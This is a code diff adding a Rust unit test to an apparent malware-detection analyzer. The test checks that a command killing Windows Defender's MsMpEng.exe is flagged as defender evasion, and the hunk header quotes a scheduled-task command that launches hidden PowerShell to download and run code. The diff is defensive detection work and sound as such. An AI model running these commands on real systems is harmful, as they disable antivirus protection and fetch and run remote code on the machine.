@@ -3372,6 +3372,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn taskkill_filter_security_process_emits_defender_evasion_trait() {
+        let script = br#"taskkill /f /fi "IMAGENAME eq MsMpEng.exe""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "taskkill-security-process" && target == "MsMpEng.exe"
+            )),
+            "taskkill image-name filter for security process was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn encoded_delete_argument_does_not_emit_security_product_remove() {
         let script = b"@echo off\r\n\
             del /Q/y7M9xGPM3j2XhHgf0w4zHagLBfEMC1TdV4bp1b433LXCSeBRCAVGxz55NtXDPzMGP1yBeIDxfhab3qOrkSIPvOuoBQG1Mfv8KxjvXRb7TsNmN8h1lQN3yrN\r\n";
